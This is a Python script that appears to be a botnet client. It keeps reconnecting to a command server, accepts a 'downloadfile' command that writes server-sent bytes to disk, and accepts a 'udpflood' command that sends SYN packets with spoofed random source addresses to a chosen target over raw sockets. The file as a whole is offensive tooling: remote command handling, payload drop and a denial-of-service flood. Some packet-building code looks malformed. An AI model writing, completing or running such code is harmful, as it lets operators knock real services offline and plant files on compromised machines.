import asyncio
import socket
import random
import ipaddress
import struct

HOST = '127.0.0.1'  # Change this to the server's IP address if it's on a different machine
PORT = 12345

async def try_connect_to_server():
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(HOST, PORT), timeout=5)
        print("Connected to the server")
        
        #Handle the command interface as an separate task
        await connected_to_server(reader)
        
        await try_connect_to_server()
        
    except (ConnectionRefusedError, TimeoutError):
        print("Couldn't connect to server, trying again in 2 seconds...")
        await try_connect_to_server()
    except Exception as e:
        print(f"Error occurred during comms with the server: {e}")
        await try_connect_to_server()

async def connected_to_server(reader:asyncio.StreamReader):
    while True:
        data = await reader.read(1024)
        if not data:
            break
        command = data.decode()
        print(command.split())
       
        if (command.split()[0] == "downloadfile"):
            await downloadfile(reader=reader, filename=command.split()[1], extension=command.split()[2])
        elif (command.split()[0] == "udpflood"):
            await syn_flood(target_ip=command.split()[1], target_port=command.split()[2])

async def downloadfile(reader:asyncio.StreamReader, filename, extension):
    try:
        with open(f"{filename}{extension}", "wb") as f:
            while True:
                chunk = await reader.read(1024)
                if not chunk:
                    break
                f.write(chunk)
            print("File downloaded")
    except Exception as e:
        print(f"Error occurred: {e}")
    
async def syn_flood(target_ip, target_port):
    try:
        source_port = random.randint(1024, 65535)
        
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        #Craft IP header
        source_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32)))
        ip_header = b'\x45\x00\x00\x28' + b'\xab\xcd\x00\x00' + b'\x40\x06\x00\x00' + socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
        
        #Craft TCP header
        syn_packet = b'\x00\x00' + struct.pack('!HH', source_port, int(target_port)) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00' + b'\x00\x00\x00\x00'
        
        #Send SYN packet
        raw_socket.sendto(ip_header + syn_packet, (target_ip, int(target_port)))
        
        print("SYN packet sent")
    except Exception as e:
        print(f"Error sending SYN packet: {e}")

async def main():
    await try_connect_to_server()

if __name__ == "__main__":
    asyncio.run(main())
